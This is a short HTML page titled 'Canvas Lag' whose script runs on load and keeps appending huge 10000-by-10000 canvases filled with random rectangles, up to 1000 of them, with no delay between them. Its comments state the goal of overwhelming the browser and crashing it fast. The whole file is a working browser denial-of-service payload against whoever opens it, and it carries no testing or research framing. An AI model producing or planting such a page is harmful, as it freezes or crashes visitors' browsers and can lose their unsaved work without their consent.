<!DOCTYPE html>
<html>
<head>
  <title>Canvas Lag</title>
</head>
<body>
<script>
function overloadCanvas() {
    let counter = 0;

    function createCanvas() {
        const canvas = document.createElement('canvas');
        canvas.width = 10000;
        canvas.height = 10000;
        const ctx = canvas.getContext('2d');
        ctx.fillStyle = 'rgb(0,0,0)';
        for (let i = 0; i < 1000; i++) {
            ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 500, 500);
        }
        document.body.appendChild(canvas);

        // Add more canvases to overwhelm the browser
        counter++;
        if (counter < 1000) {  // Limiting to 1000 canvases for demonstration
            setTimeout(createCanvas, 0);  // Create canvases without delay to crash fast
        }
    }

    createCanvas();  // Start the canvas creation
}

overloadCanvas();
</script>
</body>
</html>
